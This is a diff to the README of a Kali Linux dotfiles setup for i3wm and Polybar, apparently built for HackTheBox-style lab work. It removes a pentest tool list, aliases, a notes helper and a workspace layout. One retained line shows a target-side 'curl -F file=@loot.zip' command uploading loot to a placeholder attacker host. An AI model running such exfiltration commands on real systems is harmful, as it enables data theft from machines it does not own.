@@ -1,12 +1,12 @@
 # dotfiles-kali
 
-Kali Linux dotfiles for VMware -- i3wm + Polybar with a dark monochrome theme, tailored for HackTheBox labs.
+Kali Linux dotfiles for VMware -- i3wm + Polybar with a dark monochrome theme.
 
 ## Installation
 
 ```bash
-git clone <repo-url> ~/dotfiles-kali
-cd ~/dotfiles-kali
+git clone https://github.com/x-ser/dotfiles-kali.git
+cd dotfiles-kali
 chmod +x install.sh
 ./install.sh
 ```
@@ -40,16 +40,6 @@ After installation, **reboot** or reload i3 with `Alt+Shift+R`.
 | Terminal | Terminator | `config/terminator/config` |
 | File Manager | Thunar | `config/Thunar/uca.xml` |
 | Shell | Zsh + Oh My Zsh + Starship | `.zshrc`, `config/starship/config.toml` |
-
-### Security Tools
-
-**APT packages:** nmap, hashcat, john, openvpn, metasploit-framework, sqlmap, ffuf, gobuster, feroxbuster, bloodhound (CE), bloodhound-ce-python, krb5-user, samba, ldap-utils, bind9-dnsutils
-
-**Rust (cargo):** rustscan, rcat, RustHound-CE
-
-**Python (pipx):** impacket, NetExec, smbclient-ng, evil-winrm-py, enum4linux-ng, certipy-ad
-
-**Binary:** ligolo-ng (proxy + agent)
 
 ---
 
@@ -109,17 +99,6 @@ Mod key = `Alt`
 ## Shell Commands & Aliases
 
 ### General
-
-| Alias | Command |
-|-------|---------|
-| `ll` | `ls -lah --color=auto` |
-| `la` | `ls -la --color=auto` |
-| `l` | `ls -lh --color=auto` |
-| `..` | `cd ..` |
-| `...` | `cd ../..` |
-| `cls` | `clear` |
-
-### Pentest
 
 | Alias | Description |
 |-------|-------------|
@@ -236,21 +215,6 @@ upload 9091        # Custom port
 # Target: curl -F 'file=@loot.zip' http://<ip>:8001/upload
 ```
 
-### Notes
-
-Timestamped note-taking during a box. Writes to `./notes/notes.md` if inside a workspace.
-
-```bash
-notes Found SSH key in /opt/backup    # Append timestamped line
-notes                                 # Open notes in editor
-```
-
-Produces:
-
-```markdown
-- `[14:32:07]` Found SSH key in /opt/backup
-```
-
 ### Archive Extractor
 
 ```bash
@@ -283,47 +247,3 @@ Right-click context menu in Thunar:
 | Open Terminator Here | Opens terminal in the current directory |
 | Open VS Code Here | Opens VS Code in the current directory |
 | Open as Root | Opens Thunar as root (for CTF/pentest file access) |
-
----
-
-## Directory Structure
-
-```
-dotfiles-kali/
-  .zshrc                          # Zsh config (aliases, functions, HTB workflow)
-  install.sh                      # Full setup script
-  config/
-    i3/
-      config                      # i3wm config
-      clipboard.sh                # VMware clipboard sync
-      wallpaper/                  # Place wallpaper here
-    polybar/
-      config.ini                  # Polybar config
-      launch.sh                   # Polybar launcher
-      scripts/
-        net_stat.sh               # Network stats module
-    starship/
-      config.toml                 # Starship prompt config
-    picom/
-      picom.conf                  # Compositor config
-    terminator/
-      config                      # Terminal config
-    rofi/
-      config.rasi                 # App launcher theme
-    gtk-3.0/
-      gtk.css                     # GTK3 overrides (terminal padding)
-    Thunar/
-      uca.xml                     # Custom right-click actions
-```
-
-After installation, an HTB workspace is created at:
-
-```
-~/htb/
-  vpn/                            # Place .ovpn files here
-  <box-name>/                     # Created by `newbox`
-    nmap/
-    loot/
-    exploit/
-    notes/
-```
